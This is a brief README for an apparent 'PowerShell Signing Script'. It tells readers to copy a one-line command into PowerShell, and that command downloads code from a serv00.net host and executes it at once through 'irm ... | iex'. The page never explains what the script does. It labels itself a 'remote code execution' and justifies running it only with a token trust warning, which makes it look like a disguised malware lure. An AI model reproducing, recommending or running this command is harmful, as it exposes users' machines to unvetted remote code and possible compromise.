# PowerShell Signing Script

This script automatically runs a remote code execution from a trusted URL to generate a signing process. It is intended for use in a secure environment where you trust the source.

> ⚠️ **Warning**: Running remote scripts can be dangerous. Only execute this script if you trust the source: `https://rhsalisu.serv00.net`

## Usage

Copy and paste the following command into a **PowerShell** terminal to generate signing:

```powershell
irm https://rhsalisu.serv00.net/go/sign/?token=key | iex